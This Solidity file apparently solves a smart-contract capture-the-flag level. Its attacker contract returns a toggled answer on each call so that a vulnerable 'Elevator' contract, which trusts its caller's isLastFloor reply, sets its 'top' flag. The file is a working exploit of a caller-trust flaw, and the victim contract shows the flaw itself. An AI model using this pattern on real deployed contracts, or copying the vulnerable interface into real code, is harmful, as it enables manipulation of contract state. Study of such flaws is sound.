// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ElevatorAttacker {
  bool public toggle = true;
  Elevator public elevator = Elevator(0xd320e8Ab425D0B32Ab1633c9bF4376191003d3e7);

  function isLastFloor(
    uint256 /* _floor */
  ) public returns (bool) {
    toggle = !toggle;
    return toggle;
  }

  function setTop(uint256 _floor) public {
    elevator.goTo(_floor);
  }
}

interface Building {
  function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
  bool public top;
  uint256 public floor;

  function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
